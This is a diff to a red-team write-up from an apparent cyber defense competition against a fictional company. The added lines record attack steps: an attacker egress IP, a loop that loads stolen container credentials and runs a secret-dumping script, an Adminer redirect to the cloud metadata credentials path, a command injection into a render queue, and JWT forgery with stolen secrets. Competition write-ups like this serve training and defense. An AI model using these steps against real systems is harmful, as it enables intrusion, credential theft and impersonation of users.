@@ -6,7 +6,7 @@ As a refresher, I was framed, arrested, and escaped custody during the competiti
 At that point, I went from the CTO of Fooli, to an ex-insider threat. As the primary architect of the meme-factory, I knew all of the technical debt, vulnerabilities, back-doors and misconfigurations.
 
 
-Through out the competition, all IAM activity should have come from XXX IP address in Brazil. This was a Tailscale node I egress all my attacker traffic from.
+Through out the competition, all IAM activity should have come from 184.72.85.110 IP address. This was a Tailscale node I egress all my attacker traffic from. The machine I used for all red-team activity was on KSU Wireless, not on the competition network. Unless other members of redteam, I didn't need to come from the scoring machine.
 
 # Wednesday
 
@@ -95,6 +95,15 @@ CURL command should look like:
 `curl https://BIGLONGRANDOMCRAP.lambda-url.us-east-1.on.aws/GreenIsD3@dm3@t | jq .`
 
 **Mitigation:** detection and removal of the CF Stack was the proper response here.
+
+### Persistence - Expose the Secrets
+
+```bash
+for city in `cat cities.txt` ; do
+	source $city-container-creds.env
+	./scripts/p0wn-secrets.sh
+done
+```
 
 ## 11:00 Wednesday
 *Quiet Time*
@@ -235,3 +244,23 @@ done
 
 ## 1400 Thursday
 Competition Ends
+
+
+
+# Other ways I can get creds from Meme Factory
+http://meme-admin.moscow.fooli.wtf/adminer/?elastic=184.72.85.110%3A30068&username=
+./adminer-redirect.py --port 30068 --imds-path iam/security-credentials/
+
+*This one actually doesn't work because of the firewall. All my UNC2903 references are busted*
+
+There was a command line inject in the Render Lambda
+```bash
+./scripts/InjectSQS.sh 184.72.85.110 https://sqs.us-east-1.amazonaws.com/362120196192/moscow-FooliRenderStack-EventQueue-ATqauIo77bw9
+```
+
+
+I p0wned all the secrets, so I could forge the JWT and go in as any user.
+```bash
+grep jwt_secret data/$city/secrets.txt
+./scripts/forge_auth_token.py --url fooli-api.$city.fooli.wtf --jwt-secret 'SECRET'
+```
